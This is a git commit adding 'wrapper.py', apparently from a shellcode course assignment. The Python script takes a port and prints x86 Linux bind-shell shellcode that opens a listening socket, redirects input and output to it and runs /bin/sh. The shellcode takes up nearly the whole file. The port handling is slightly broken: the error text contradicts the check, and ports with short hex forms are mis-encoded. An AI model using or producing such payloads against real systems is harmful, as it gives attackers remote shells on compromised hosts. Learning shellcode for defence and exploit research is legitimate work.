80d1b57c5583505ee7e2e7add44c9663b038604a
RawrRadioMouse <55473161+RawrRadioMouse@users.noreply.github.com>
2020-06-16 14:44:48 +0930

    Create wrapper.py

---
+++ Assignment_1/wrapper.py
@@ -0,0 +1,26 @@
+#!/usr/bin/python
+
+import sys
+
+if len(sys.argv) <= 1:
+	print 'Usage: wrapper.py <port>'
+	exit()
+port = int(sys.argv[1])
+if (port < 1024 or port > 65535):
+	print "[!] {} not a valid port, must be between 0-65535!".format(port)
+	exit()
+port = hex(port)[2:]
+port = '\\x'+str(port[0:2]) + '\\x'+str(port[2:4])		
+shellcode = ""
+shellcode += "\\x31\\xc0\\x50\\x6a\\x01\\x6a\\x02\\x31\\xc9\\x89\\xe1\\xb0"
+shellcode += "\\x66\\xb3\\x01\\xcd\\x80\\x89\\xc6\\x31\\xdb\\x53\\x66\\x68"
+shellcode += port
+shellcode += "\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\xb3"
+shellcode += "\\x02\\xb0\\x66\\xcd\\x80\\x6a\\x01\\x56\\x89\\xe1\\xb3\\x04"
+shellcode += "\\xb0\\x66\\xcd\\x80\\x50\\x50\\x56\\x89\\xe1\\xb3\\x05\\xb0"
+shellcode += "\\x66\\xcd\\x80\\x89\\xc3\\x31\\xc9\\xb0\\x3f\\xcd\\x80\\x41"
+shellcode += "\\x80\\xf9\\x04\\x75\\xf6\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73"
+shellcode += "\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53"
+shellcode += "\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
+print(shellcode)
+
